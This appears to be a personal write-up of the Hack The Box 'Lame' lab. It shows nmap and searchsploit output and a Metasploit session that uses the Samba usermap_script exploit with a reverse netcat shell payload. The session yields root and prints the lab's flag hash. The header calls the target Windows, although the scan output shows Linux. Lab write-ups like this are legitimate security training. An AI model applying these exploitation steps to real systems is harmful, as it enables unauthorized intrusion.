---
layout: default
title: Lame
description: by Hack The Box
---

<h3 align="center">
Windows machine
</h3>

## Enumeration

1. Let's run nmap

   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ nmap 10.10.10.3 -A -T4 -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 15:51 EST
   Nmap scan report for 10.10.10.3
   Host is up (0.030s latency).
   Not shown: 996 filtered tcp ports (no-response)
   PORT    STATE SERVICE     VERSION
   21/tcp  open  ftp         vsftpd 2.3.4
   |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
   | ftp-syst:
   |   STAT:
   | FTP server status:
   |      Connected to 10.10.14.3
   |      Logged in as ftp
   |      TYPE: ASCII
   |      No session bandwidth limit
   |      Session timeout in seconds is 300
   |      Control connection is plain text
   |      Data connections will be plain text
   |      vsFTPd 2.3.4 - secure, fast, stable
   |_End of status
   22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
   | ssh-hostkey:
   |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
   |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
   139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
   Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

   Host script results:
   | smb-security-mode:
   |   account_used: <blank>
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   |_smb2-time: Protocol negotiation failed (SMB2)
   | smb-os-discovery:
   |   OS: Unix (Samba 3.0.20-Debian)
   |   Computer name: lame
   |   NetBIOS computer name:
   |   Domain name: hackthebox.gr
   |   FQDN: lame.hackthebox.gr
   |_  System time: 2021-11-23T15:40:24-05:00
   |_clock-skew: mean: 2h18m37s, deviation: 3h32m08s, median: -11m23s

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 56.49 seconds
   ```

2. Let's look for vuln for these services point of interest is port 21 and port 139/445
   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ searchsploit ftpd 2.3.4
   -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                                                            |  Path
   -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   OpenBSD 2.x < 2.8 FTPd - 'glob()' Remote Buffer Overflow                                                                  | openbsd/remote/20733.c
   RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)                                                  | windows/remote/18190.rb
   vsftpd 2.3.4 - Backdoor Command Execution                                                                                 | unix/remote/49757.py
   vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                    | unix/remote/17491.rb
   -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Shellcodes: No Result
   ```
3. Let's run Metasploit
4. So in metasploit after putting in the options of rhosts... I could not get a shell. For some reason that is not vulnerable? but funny how it says that, that particular version is.
5. It is also worth noting that you can login to the box through ftp using username `anonymous` and password `anonymous`... but there really isn't much you can do there as well. I think it's due to the fact of the user privilege.
6. Back in the MSFconsole lets search for the samba 3.0 service

   ```
   msf6 > search samba 3.0

   Matching Modules
   ================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
   1  exploit/linux/samba/chain_reply            2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   2  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   3  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   4  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow


   Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/lsa_transnames_heap

   msf6 > use 0
   [*] No payload configured, defaulting to cmd/unix/reverse_netcat
   msf6 exploit(multi/samba/usermap_script) > options

   Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


   Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.15.37    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


   Exploit target:

   Id  Name
   --  ----
   0   Automatic
   ```

7. It is important to note (or maybe coz im noobish) that you will need to also change the LHOST param and use your tunnel's IP add.
8. A shell is giving when you run the exploit
   ```
   whoami
   root
   ls
   bin
   boot
   cdrom
   dev
   etc
   home
   initrd
   initrd.img
   initrd.img.old
   lib
   lost+found
   media
   mnt
   nohup.out
   opt
   proc
   root
   sbin
   srv
   sys
   tmp
   usr
   var
   vmlinuz
   vmlinuz.old
   cd root
   ls
   Desktop
   reset_logs.sh
   root.txt
   vnc.log
   cat root.txt
   a89ccd5f0604b08ed6c5498c76153ae3
   exit
   ```
9. And there we have it... root.txt contains the flag!

<br><Br><br>

# References

1. https://www.exploit-db.com/exploits/49757
2. https://www.exploit-db.com/exploits/16320

<br><br>

[back to HOME](./)
